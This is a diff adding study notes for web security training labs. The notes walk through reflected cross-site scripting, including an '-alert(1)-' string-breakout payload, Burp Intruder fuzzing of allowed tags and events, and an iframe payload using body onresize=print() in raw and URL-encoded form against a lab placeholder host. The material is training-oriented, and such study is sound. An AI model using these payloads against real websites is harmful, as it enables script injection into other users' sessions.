@@ -30,6 +30,36 @@
 // results in:
 var searchTerms = ''-alert(1)-'';
 
+===
+
+// try a standard vector...
+<img src=1 onerror=print()>
+
+// it gets blocked...
+// use burp intruder to test a wide variety of tags and see what is allowed
+// list can be found here:
+// https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+// the intruder payload should look like:
+GET /?search=<§§> HTTP/2
+
+// we see that "body" and "custom tags" are allowed...
+// now we'll use intruder again to test event payloads to see what is allowed:
+// use the list from the same cheet sheet above...
+<body%20§§=1>
+
+// there are a number of payloads (events) that are allowed.
+// let's use the onresize event.
+// we craft our payload.
+// we embed this on our own web server and try to get the victim to visit it.
+// if the victim visits our page,
+// the iframe loads the target site along with the xss payload
+// since we control the iframe, we resize it, which triggers onresize
+// and javascript excutes on the client for the target website.
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search="><body onresize=print()>" onload=this.style.width='100px'>
+
+// url encode relevant chars:
+// need this to prevent problems with quotes, etc.
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 
 
 
